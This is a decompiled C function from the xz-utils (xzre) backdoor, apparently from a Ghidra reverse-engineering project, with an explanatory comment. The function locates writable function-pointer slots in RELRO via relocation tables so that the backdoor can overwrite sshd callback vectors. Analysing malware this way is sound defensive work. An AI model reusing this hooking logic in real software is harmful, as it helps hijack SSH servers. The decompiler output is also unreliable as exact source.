// /home/kali/xzre-ghidra/xzregh/102A50_elf_find_function_pointer.c
// Function: elf_find_function_pointer @ 0x102A50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_function_pointer(StringXrefId xref_id, void * * pOutCodeStart, void * * pOutCodeEnd, void * * pOutFptrAddr, elf_info_t * elf_info, string_references_t * xrefs, global_context_t * ctx)


/*
 * AutoDoc: Given a populated string-reference entry, finds the function-pointer slot associated with that reference.
 * It copies the recorded `func_start`/`func_end` to the outputs, scans the RELA table (and then RELR as a fallback) for a relocation targeting that function, and treats the relocation address as the writable slot to return.
 * The slot must reside inside RELRO, and when `ctx->uses_endbr64` is set the helper confirms the referenced code starts with ENDBR64 before handing the pointer back so callers can safely overwrite sshd callback vectors.
 */

#include "xzre_types.h"

BOOL elf_find_function_pointer
               (StringXrefId xref_id,void **pOutCodeStart,void **pOutCodeEnd,void **pOutFptrAddr,
               elf_info_t *elf_info,string_references_t *xrefs,global_context_t *ctx)

{
  void *pvVar1;
  BOOL BVar2;
  Elf64_Rela *pEVar3;
  Elf64_Relr *pEVar4;
  
  pvVar1 = xrefs->entries[xref_id].func_start;
  if (pvVar1 == (void *)0x0) {
    return FALSE;
  }
  *pOutCodeStart = pvVar1;
  *pOutCodeEnd = xrefs->entries[xref_id].func_end;
  pEVar3 = elf_find_rela_reloc(elf_info,(EncodedStringId)*pOutCodeStart,0);
  *pOutFptrAddr = pEVar3;
  if (pEVar3 == (Elf64_Rela *)0x0) {
    pEVar4 = elf_find_relr_reloc(elf_info,(EncodedStringId)*pOutCodeStart);
    *pOutFptrAddr = pEVar4;
    if (pEVar4 == (Elf64_Relr *)0x0) {
      return FALSE;
    }
  }
  BVar2 = elf_contains_vaddr_relro(elf_info,(long)*pOutFptrAddr - 8,0x10,1);
  if (BVar2 == FALSE) {
    return FALSE;
  }
  if (ctx->uses_endbr64 != FALSE) {
    BVar2 = is_endbr64_instruction((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
    return (uint)(BVar2 != FALSE);
  }
  return TRUE;
}

